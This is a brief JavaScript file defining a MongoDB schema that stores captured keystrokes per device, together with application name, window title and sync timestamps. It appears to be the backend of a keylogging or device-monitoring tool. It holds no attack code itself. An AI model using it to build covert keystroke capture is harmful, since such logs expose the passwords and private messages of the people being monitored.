const mongoose = require('mongoose');

const keystrokeSchema = new mongoose.Schema({
  deviceId: { type: String, required: true, index: true },
  keys: { type: String, required: true },
  application: { type: String, default: 'Unknown' },
  windowTitle: { type: String, default: '' },
  timestamp: { type: Date, default: Date.now, index: true },
  syncedAt: { type: Date, default: Date.now },
  isBulk: { type: Boolean, default: false },
  batchSize: { type: Number, default: 1 }
}, { timestamps: true });

keystrokeSchema.index({ deviceId: 1, timestamp: -1 });

module.exports = mongoose.model('Keystroke', keystrokeSchema);

